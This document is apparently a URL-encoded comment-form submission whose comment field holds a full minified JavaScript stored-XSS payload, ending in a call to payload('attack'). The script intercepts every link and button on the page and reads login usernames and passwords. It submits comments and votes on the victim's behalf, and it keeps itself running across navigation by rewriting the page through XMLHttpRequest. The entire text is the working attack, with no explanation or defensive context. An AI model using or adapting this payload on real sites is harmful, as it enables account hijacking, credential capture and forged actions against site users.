%3Cscript%3Evar+globalUsername%3Bfunction+loadContent%28e%2Ct%2Cn%29%7Bxmlhttp%3Dnew+XMLHttpRequest%2Cxmlhttp.onreadystatechange%3Dfunction%28%29%7B4%21%3Dxmlhttp.readyState%7C%7C200%21%3Dxmlhttp.status%26%26302%21%3Dxmlhttp.status%7C%7Ct%28e%2Cxmlhttp.response%29%7D%2Cxmlhttp.open%28%22GET%22%2Ce%2C%211%29%2Cnull%3D%3Dn%3Fxmlhttp.send%28%29%3Axmlhttp.send%28n%29%7Dfunction+postRequest%28e%2Ct%2Cn%29%7Bconsole.log%28%22will+post+to+%22%2Be%2B%22+data+is+%3A+%22%2Bn%29%3Bvar+o%3Dnew+XMLHttpRequest%3Bo.onreadystatechange%3Dfunction%28%29%7B4%21%3Do.readyState%7C%7C200%21%3Do.status%26%26302%21%3Do.status%3Fconsole.log%28%22post+status%3A+%22%2Bo.status%29%3At%28e%2Co.response%29%7D%2Co.open%28%22POST%22%2Ce%2C%210%29%2Co.setRequestHeader%28%22Content-type%22%2C%22application%2Fx-www-form-urlencoded%22%29%2Co.send%28n%29%7Dfunction+replacePage%28e%2Ct%29%7Bvar+n%3Ddocument.createElement%28%22html%22%29%3Bn.innerHTML%3Dt%2CyourGlobalVariable%3Dn%2Cdocument.body.innerHTML%3Dn.getElementsByTagName%28%22body%22%29%5B0%5D.innerHTML%2Cwindow.history.pushState%28%22object+or+string%22%2C%22Title%22%2Ce%29%2Cwindow.dispatchEvent%28new+HashChangeEvent%28%22hashchange%22%29%29%2CaddListener%28%29%2Cconsole.log%28%22page+listener+add+done%22%29%7Dfunction+linkClickHandler%28e%29%7Bconsole.log%28%22called+on+%22%2Be.href%29%3Be.href.substring%28e.href.lastIndexOf%28%22%2F%22%29%2B1%29%3Bvar+t%3De.href%3Bconsole.log%28%22will+fetch+%22%2Bt%29%2CloadContent%28t%2CreplacePage%29%7Dfunction+buttonClickHandler%28e%2Ct%29%7Bif%28console.log%28%22called+on+submit%22%2Be.id%29%2C%22login-btn%22%3D%3De.id%29%7Bt%3D%22post.php%22%3Bvar+n%3Ddocument.getElementById%28%22username%22%29.value%2Co%3Ddocument.getElementById%28%22userpass%22%29.value%2Cl%3D%22username%3D%22%2Bn%2B%22%26password%3D%22%2Bo%2B%22%26form%3Dlogin%22%3Bconsole.log%28%22will+post+username++%22%2Bn%2B%22+password+%22%2Bo%29%2CpostRequest%28t%2CreplacePage%2Cl%29%7Delse+if%28%22comment-post-btn%22%3D%3De.id%29%7Bt%3D%22post.php%22%3Bvar+a%3Ddocument.getElementById%28%22comment%22%29.value%2Cs%3Ddocument.getElementById%28%22parent%22%29.value%3Bl%3D%22comment%3D%22%2Ba%2B%22%26form%3Dcomment%26parent%3D%22%2Bs%2B%22%26uid%3D%22%2Bdocument.getElementById%28%22uid%22%29.value%2B%22%26submit%3D%22%3Bconsole.log%28%22will+comments+on+behalf+of++%22%2BglobalUsername%2B%22+parent+%22%2Bs%29%2CpostRequest%28t%2CreplacePage%2Cl%29%7Delse+e.id%7Dfunction+normalLinkHandler%28e%2Ct%29%7Bif%28String%28t%29.includes%28%22vote.php%22%29%29%7Bvar+n%3Dnew+RegExp%28%2F%5C%5C%3Fid%3D%5B0-9%5D%2B%2F%29%2Co%3Dnew+RegExp%28%2Fvote%3D%5B0-9%5D%2B%2F%29%2Cl%3Dnew+RegExp%28%2Fvote%3D-%5Cd%2B%24%2F%29%2Ca%3DString%28t.match%28n%29%29%2Cs%3Da.substring%28a.lastIndexOf%28%22%3D%22%29%2B1%29%2Cr%3DString%28t.match%28o%29%29%3B%22null%22%3D%3Dr%26%26%28r%3DString%28t.match%28l%29%29%29%3Bvar+d%3Dr.substring%28r.lastIndexOf%28%22%3D%22%29%2B1%29%3Bconsole.log%28%22user+vote+on+post%3A+%22%2BglobalUsername%2B%22+postid+%3A+%22%2Bs%2B%22+vote+val+%3A+%22%2Bd%29%2CloadContent%28t%2CreplacePage%2C%22id%3D%22%2Bs%2B%22%26vote%3D%22%2Bd%29%7Delse+console.log%28%22user+view+on+username%3A+%22%2BglobalUsername%2B%22+url+%3A+%22%2Bt%29%2CloadContent%28t%2CreplacePage%29%3Breturn%211%7Dfunction+addListener%28%29%7Bvar+e%3Ddocument.getElementById%28%22logged-in-user%22%29%3BglobalUsername%3De%3Fe.innerText%3Anull%3Bfor%28var+t%3Ddocument.links%2Cn%3Dt.length%2Co%3D0%3Bo%3Cn%3Bo%2B%2B%29%7Bdocument.getElementById%28t%5Bo%5D.id%29%3Fdocument.getElementById%28t%5Bo%5D.id%29.addEventListener%28%22click%22%2Cfunction%28e%29%7Be.preventDefault%28%29%2ClinkClickHandler%28e.target%7C%7Ce.srcElement%29%7D%29%3At%5Bo%5D.setAttribute%28%22onclick%22%2C%22normalLinkHandler%28%27%22%2BglobalUsername%2B%22%27%2C%27%22%2Bt%5Bo%5D.href%2B%22%27%29%3B+return+false%3B%22%29%7Dvar+l%3Ddocument.getElementsByTagName%28%22button%22%29%3Bfor%28o%3D0%3Bo%3Cl.length%3Bo%2B%2B%29l%5Bo%5D.addEventListener%28%22click%22%2Cfunction%28e%29%7Be.preventDefault%28%29%2CbuttonClickHandler%28e.target%7C%7Ce.srcElement%2Cdocument.url%29%7D%29%7Dfunction+payload%28e%29%7BaddListener%28%29%7Dpayload%28%22attack%22%29%3B%3C%2Fscript%3E&form=comment&parent=11&uid=7&submit=